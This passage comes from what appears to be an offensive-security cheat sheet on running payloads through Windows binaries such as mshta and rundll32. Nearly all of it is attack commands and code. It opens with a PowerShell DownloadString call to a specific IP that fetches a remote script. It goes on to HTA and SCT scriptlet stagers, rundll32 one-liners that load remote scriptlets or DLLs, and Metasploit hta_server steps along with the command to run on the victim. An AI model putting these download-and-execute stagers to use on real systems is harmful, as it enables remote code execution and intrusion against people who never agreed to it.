t.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt> You can download & execute very easily a Koadic zombie using the stager hta hta example From here xml <html> <head> <HTA:APPLICATION ID="HelloExample"> <script language="jscript"> var c = "cmd.exe /c calc.exe"; new ActiveXObject('WScript.Shell').Run(c); </script> </head> <body> <script>self.close();</script> </body> </html> mshta - sct From here xml <?XML version="1.0"?> <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close(); --> <!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) --> <!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) --> <scriptlet> <public> </public> <script language="JScript"> <![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); ]]> </script> </scriptlet> Mshta - Metasploit bash use exploit/windows/misc/hta_server msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109 msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109 msf exploit(windows/misc/hta_server) > exploit bash Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit Detected by defender Rundll32 Dll hello world example From here bash rundll32 \\webdavserver\folder\payload.dll,entrypoint bash rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close(); Detected by defender Rundll32 - sct From here xml <?XML version="1.0"?> <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close(); --> <!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) --> <scriptlet> <public> </public> <script language="JScript"> <![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); ]]> </script> </scriptlet> Rundll32 - Metasploit